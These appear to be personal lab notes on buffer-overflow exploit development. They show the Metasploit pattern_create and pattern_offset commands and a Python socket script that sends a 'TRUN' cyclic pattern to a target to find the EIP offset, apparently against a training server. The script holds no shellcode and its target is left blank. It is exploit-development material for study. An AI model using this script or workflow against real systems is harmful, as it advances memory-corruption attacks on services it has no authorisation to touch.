### Pattern
##### Create
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```
![[Pasted image 20210726101033.png]]

##### Find
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q EIP
```
EIP is the pattern value at EIP register
![[Pasted image 20210726102128.png]]

### Script
```python
import socket

ip = ""
port = 0

prefix = "TRUN "
offset = "" # pattern generated
postfix = "\r\n"

buffer = prefix + offset + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	s.recv(1024)
	print("Sending pattern . . .")
	s.send((buffer.encode()))
	print("Done!")
except:
    print("Could not connect.")
```